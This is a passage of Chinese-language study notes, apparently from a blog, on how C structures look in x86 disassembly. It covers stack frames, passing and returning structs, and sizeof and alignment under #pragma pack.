esp,ebp</span><br><span class=\"line\"><span class=\"number\">00401052</span>  |.  <span class=\"number\">5</span>D                   pop     ebp</span><br><span class=\"line\"><span class=\"number\">00401053</span>  \\.  C3                   retn</span><br><span class=\"line\"></span><br><span class=\"line\">func2</span><br><span class=\"line\"><span class=\"number\">00401080</span> &gt;/&gt; \\<span class=\"number\">55</span>                   push    ebp</span><br><span class=\"line\"><span class=\"number\">00401081</span>  |.  <span class=\"number\">8B</span>EC                 mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401083</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C              sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401086</span>  |.  <span class=\"number\">53</span>                   push    ebx</span><br><span class=\"line\"><span class=\"number\">00401087</span>  |.  <span class=\"number\">56</span>                   push    esi</span><br><span class=\"line\"><span class=\"number\">00401088</span>  |.  <span class=\"number\">57</span>                   push    edi</span><br><span class=\"line\"><span class=\"number\">00401089</span>  |.  <span class=\"number\">8</span>D7D B4              lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040108</span>C  |.  B9 <span class=\"number\">13000000</span>          mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00401091</span>  |.  B8 CCCCCCCC          mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401096</span>  |.  F3:AB                rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401098</span>  |.  C745 FC <span class=\"number\">0</span>A000000     mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040109F</span>  |.  C745 F8 <span class=\"number\">14000000</span>     mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A6  |.  C745 F4 <span class=\"number\">1E000000</span>     mov     [local<span class=\"number\">.3</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">004010</span>AD  |.  <span class=\"number\">5F</span>                   pop     edi</span><br><span class=\"line\"><span class=\"number\">004010</span>AE  |.  <span class=\"number\">5</span>E                   pop     esi</span><br><span class=\"line\"><span class=\"number\">004010</span>AF  |.  <span class=\"number\">5B</span>                   pop     ebx</span><br><span class=\"line\"><span class=\"number\">004010B</span>0  |.  <span class=\"number\">8B</span>E5                 mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">004010B</span>2  |.  <span class=\"number\">5</span>D                   pop     ebp</span><br><span class=\"line\"><span class=\"number\">004010B</span>3  \\.  C3                   retn</span><br><span class=\"line\"></span><br><span class=\"line\">func3</span><br><span class=\"line\"><span class=\"number\">004106F</span>0 &gt;/&gt; \\<span class=\"number\">55</span>                    push    ebp</span><br><span class=\"line\"><span class=\"number\">004106F</span>1  |.  <span class=\"number\">8B</span>EC                  mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">004106F</span>3  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C               sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">004106F</span>6  |.  <span class=\"number\">53</span>                    push    ebx</span><br><span class=\"line\"><span class=\"number\">004106F</span>7  |.  <span class=\"number\">56</span>                    push    esi</span><br><span class=\"line\"><span class=\"number\">004106F</span>8  |.  <span class=\"number\">57</span>                    push    edi</span><br><span class=\"line\"><span class=\"number\">004106F</span>9  |.  <span class=\"number\">8</span>D7D B4               lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">004106F</span>C  |.  B9 <span class=\"number\">13000000</span>   \t\tmov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00410701</span>  |.  B8 CCCCCCCC   \t\tmov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00410706</span>  |.  F3:AB         \t\trep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00410708</span>  |.  C745 F4 <span class=\"number\">0</span>A000&gt;\t\tmov     [local<span class=\"number\">.3</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0041070F</span>  |.  C745 F8 <span class=\"number\">14000</span>&gt;\t\tmov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00410716</span>  |.  C745 FC <span class=\"number\">1E000</span>&gt;\t\tmov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">0041071</span>D  |.  <span class=\"number\">5F</span>            \t\tpop     edi</span><br><span class=\"line\"><span class=\"number\">0041071</span>E  |.  <span class=\"number\">5</span>E            \t\tpop     esi</span><br><span class=\"line\"><span class=\"number\">0041071F</span>  |.  <span class=\"number\">5B</span>            \t\tpop     ebx</span><br><span class=\"line\"><span class=\"number\">00410720</span>  |.  <span class=\"number\">8B</span>E5          \t\tmov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00410722</span>  |.  <span class=\"number\">5</span>D            \t\tpop     ebp</span><br><span class=\"line\"><span class=\"number\">00410723</span>  \\.  C3            \t\tretn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>结构体可以作为参数和返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tshort b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void func(st x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = 1;</span><br><span class=\"line\">\tx.b = 2;</span><br><span class=\"line\">\tx.c = 3;</span><br><span class=\"line\">\tfunc(x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 48             sub         esp,48h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D B8             lea         edi,[ebp-48h]</span><br><span class=\"line\">0040104C B9 12 00 00 00       mov         ecx,12h</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 C7 45 F8 01 00 00 00 mov         dword ptr [ebp-8],1</span><br><span class=\"line\">0040105F 66 C7 45 FC 02 00    mov         word ptr [ebp-4],offset main+23h (00401063)</span><br><span class=\"line\">00401065 C6 45 FE 03          mov         byte ptr [ebp-2],3</span><br><span class=\"line\">00401069 8B 45 FC             mov         eax,dword ptr [ebp-4]</span><br><span class=\"line\">0040106C 50                   push        eax</span><br><span class=\"line\">0040106D 8B 4D F8             mov         ecx,dword ptr [ebp-8]</span><br><span class=\"line\">00401070 51                   push        ecx</span><br><span class=\"line\">00401071 E8 A3 FF FF FF       call        @ILT+20(func) (00401019)</span><br><span class=\"line\">00401076 83 C4 08             add         esp,8</span><br><span class=\"line\">00401079 33 C0                xor         eax,eax</span><br><span class=\"line\">0040107B 5F                   pop         edi</span><br><span class=\"line\">0040107C 5E                   pop         esi</span><br><span class=\"line\">0040107D 5B                   pop         ebx</span><br><span class=\"line\">0040107E 83 C4 48             add         esp,48h</span><br><span class=\"line\">00401081 3B EC                cmp         ebp,esp</span><br><span class=\"line\">00401083 E8 E8 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">00401088 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040108A 5D                   pop         ebp</span><br><span class=\"line\">0040108B C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\">ebp-4</span><br><span class=\"line\">0018FF44  02 00 03 CC 88 FF 18</span><br><span class=\"line\">ebp-8</span><br><span class=\"line\">0018FF40  01 00 00 00 02 00 03</span><br><span class=\"line\">第二次push的时候把short和char一起push了</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">struct st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">\tint e;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void func(st x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = 1;</span><br><span class=\"line\">\tx.b = 2;</span><br><span class=\"line\">\tx.c = 3;</span><br><span class=\"line\">\tx.d = 4;</span><br><span class=\"line\">\tx.e = 5;</span><br><span class=\"line\">\tfunc(x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 54             sub         esp,54h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D AC             lea         edi,[ebp-54h]</span><br><span class=\"line\">0040104C B9 15 00 00 00       mov         ecx,15h</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 C7 45 EC 01 00 00 00 mov         dword ptr [ebp-14h],1</span><br><span class=\"line\">0040105F C7 45 F0 02 00 00 00 mov         dword ptr [ebp-10h],2</span><br><span class=\"line\">00401066 C7 45 F4 03 00 00 00 mov         dword ptr [ebp-0Ch],3</span><br><span class=\"line\">0040106D C7 45 F8 04 00 00 00 mov         dword ptr [ebp-8],4</span><br><span class=\"line\">00401074 C7 45 FC 05 00 00 00 mov         dword ptr [ebp-4],5</span><br><span class=\"line\">0040107B 83 EC 14             sub         esp,14h</span><br><span class=\"line\">0040107E B9 05 00 00 00       mov         ecx,5</span><br><span class=\"line\">00401083 8D 75 EC             lea         esi,[ebp-14h]</span><br><span class=\"line\">00401086 8B FC                mov         edi,esp</span><br><span class=\"line\">00401088 F3 A5                rep movs    dword ptr [edi],dword ptr [esi]</span><br><span class=\"line\">0040108A E8 8A FF FF FF       call        @ILT+20(func) (00401019)</span><br><span class=\"line\">0040108F 83 C4 14             add         esp,14h</span><br><span class=\"line\">00401092 33 C0                xor         eax,eax</span><br><span class=\"line\">00401094 5F                   pop         edi</span><br><span class=\"line\">00401095 5E                   pop         esi</span><br><span class=\"line\">00401096 5B                   pop         ebx</span><br><span class=\"line\">00401097 83 C4 54             add         esp,54h</span><br><span class=\"line\">0040109A 3B EC                cmp         ebp,esp</span><br><span class=\"line\">0040109C E8 CF 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">004010A1 8B E5                mov         esp,ebp</span><br><span class=\"line\">004010A3 5D                   pop         ebp</span><br><span class=\"line\">004010A4 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\">此时传参和push原理一样，此时先把所有堆栈提升，再填充提升的堆栈</span><br><span class=\"line\">结构体传参通过堆栈传参</span><br></pre></td></tr></table></figure>\n<p>结构体作为返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401040 55                   push        ebp</span><br><span class=\"line\">00401041 8B EC                mov         ebp,esp</span><br><span class=\"line\">00401043 83 EC 70             sub         esp,70h</span><br><span class=\"line\">00401046 53                   push        ebx</span><br><span class=\"line\">00401047 56                   push        esi</span><br><span class=\"line\">00401048 57                   push        edi</span><br><span class=\"line\">00401049 8D 7D 90             lea         edi,[ebp-70h]</span><br><span class=\"line\">0040104C B9 1C 00 00 00       mov         ecx,1Ch</span><br><span class=\"line\">00401051 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00401056 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00401058 8D 45 D0             lea         eax,[ebp-30h]</span><br><span class=\"line\">0040105B 50                   push        eax</span><br><span class=\"line\">0040105C E8 BD FF FF FF       call        @ILT+25(func3) (0040101e)</span><br><span class=\"line\">00401061 83 C4 04             add         esp,4</span><br><span class=\"line\"></span><br><span class=\"line\">00401064 8B 08                mov         ecx,dword ptr [eax]</span><br><span class=\"line\">00401066 89 4D E0             mov         dword ptr [ebp-20h],ecx</span><br><span class=\"line\">00401069 8B 50 04             mov         edx,dword ptr [eax+4]</span><br><span class=\"line\">0040106C 89 55 E4             mov         dword ptr [ebp-1Ch],edx</span><br><span class=\"line\">0040106F 8B 48 08             mov         ecx,dword ptr [eax+8]</span><br><span class=\"line\">00401072 89 4D E8             mov         dword ptr [ebp-18h],ecx</span><br><span class=\"line\">00401075 8B 50 0C             mov         edx,dword ptr [eax+0Ch]</span><br><span class=\"line\">00401078 89 55 EC             mov         dword ptr [ebp-14h],edx</span><br><span class=\"line\">0040107B 8B 45 E0             mov         eax,dword ptr [ebp-20h]</span><br><span class=\"line\">0040107E 89 45 F0             mov         dword ptr [ebp-10h],eax</span><br><span class=\"line\">00401081 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]</span><br><span class=\"line\">00401084 89 4D F4             mov         dword ptr [ebp-0Ch],ecx</span><br><span class=\"line\">00401087 8B 55 E8             mov         edx,dword ptr [ebp-18h]</span><br><span class=\"line\">0040108A 89 55 F8             mov         dword ptr [ebp-8],edx</span><br><span class=\"line\">0040108D 8B 45 EC             mov         eax,dword ptr [ebp-14h]</span><br><span class=\"line\">00401090 89 45 FC             mov         dword ptr [ebp-4],eax</span><br><span class=\"line\">00401093 33 C0                xor         eax,eax</span><br><span class=\"line\">00401095 5F                   pop         edi</span><br><span class=\"line\">00401096 5E                   pop         esi</span><br><span class=\"line\">00401097 5B                   pop         ebx</span><br><span class=\"line\">00401098 83 C4 70             add         esp,70h</span><br><span class=\"line\">0040109B 3B EC                cmp         ebp,esp</span><br><span class=\"line\">0040109D E8 CE 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">004010A2 8B E5                mov         esp,ebp</span><br><span class=\"line\">004010A4 5D                   pop         ebp</span><br><span class=\"line\">004010A5 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">004106F0 55                   push        ebp</span><br><span class=\"line\">004106F1 8B EC                mov         ebp,esp</span><br><span class=\"line\">004106F3 83 EC 50             sub         esp,50h</span><br><span class=\"line\">004106F6 53                   push        ebx</span><br><span class=\"line\">004106F7 56                   push        esi</span><br><span class=\"line\">004106F8 57                   push        edi</span><br><span class=\"line\">004106F9 8D 7D B0             lea         edi,[ebp-50h]</span><br><span class=\"line\">004106FC B9 14 00 00 00       mov         ecx,14h</span><br><span class=\"line\">00410701 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00410706 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00410708 C7 45 F0 01 00 00 00 mov         dword ptr [ebp-10h],1</span><br><span class=\"line\">0041070F 66 C7 45 F4 02 00    mov         word ptr [ebp-0Ch],offset func+23h (00410713)</span><br><span class=\"line\">00410715 C6 45 F6 03          mov         byte ptr [ebp-0Ah],3</span><br><span class=\"line\">00410719 C7 45 F8 04 00 00 00 mov         dword ptr [ebp-8],4</span><br><span class=\"line\">00410720 C7 45 FC 05 00 00 00 mov         dword ptr [ebp-4],5</span><br><span class=\"line\"></span><br><span class=\"line\">00410727 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\">0041072A 8B 4D F0             mov         ecx,dword ptr [ebp-10h]</span><br><span class=\"line\">0041072D 89 08                mov         dword ptr [eax],ecx</span><br><span class=\"line\">0041072F 8B 55 F4             mov         edx,dword ptr [ebp-0Ch]</span><br><span class=\"line\">00410732 89 50 04             mov         dword ptr [eax+4],edx</span><br><span class=\"line\">00410735 8B 4D F8             mov         ecx,dword ptr [ebp-8]</span><br><span class=\"line\">00410738 89 48 08             mov         dword ptr [eax+8],ecx</span><br><span class=\"line\">0041073B 8B 55 FC             mov         edx,dword ptr [ebp-4]</span><br><span class=\"line\">0041073E 89 50 0C             mov         dword ptr [eax+0Ch],edx</span><br><span class=\"line\">00410741 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\"></span><br><span class=\"line\">00410744 5F                   pop         edi</span><br><span class=\"line\">00410745 5E                   pop         esi</span><br><span class=\"line\">00410746 5B                   pop         ebx</span><br><span class=\"line\">00410747 8B E5                mov         esp,ebp</span><br><span class=\"line\">00410749 5D                   pop         ebp</span><br><span class=\"line\">0041074A C3                   ret</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>总结：如果不用指针，别声明结构体为局部变量，别把结构体当做返回值和参数</p>\n<hr>\n<p>sizeof</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sizeof(char);</span><br><span class=\"line\"></span><br><span class=\"line\">char arr1[10]</span><br><span class=\"line\">short arr2[10]   //20</span><br><span class=\"line\">int arr3[10]     //40</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(arr1)     //10</span><br><span class=\"line\">sizeof(arr1[10])   //1</span><br><span class=\"line\"></span><br><span class=\"line\">struct s1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;   //12</span><br><span class=\"line\">a 0 0 0</span><br><span class=\"line\">b b b b</span><br><span class=\"line\">c 0 0 0</span><br><span class=\"line\">struct s2</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tchar a;</span><br><span class=\"line\">\tchar b;</span><br><span class=\"line\">&#125;;   //8</span><br><span class=\"line\">c c c c</span><br><span class=\"line\">a b 0 0</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(s1);    //12</span><br><span class=\"line\">sizeof(s2);    //8</span><br><span class=\"line\"></span><br><span class=\"line\">对齐参数：结构体中参数以几字节对齐,取值1,2,4,8 默认为8</span><br><span class=\"line\">#pragma pack(1)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //13</span><br><span class=\"line\"></span><br><span class=\"line\">如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值.</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(2)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //14</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(4)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //16</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(4)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //24</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122135557244.png\" alt=\"image-20230122135557244\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122140313752.png\" alt=\"image-20230122140313752\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122140354031.png\" alt=\"image-20230122140354031\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对齐原则</span><br><span class=\"line\">原则一:数据成员对齐规则。结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为4字节，则要从4的整数倍地址开始存储).</span><br><span class=\"line\">原则二:结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。</span><br><span class=\"line\">原则三:如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。(struct a里存有struct b， b里有char，int，double等元素，那b应该从8的整数倍开始存储.)</span><br><span class=\"line\">原则四:对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.也就是说，结构体成员的偏移量应该取二者的最小值.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img 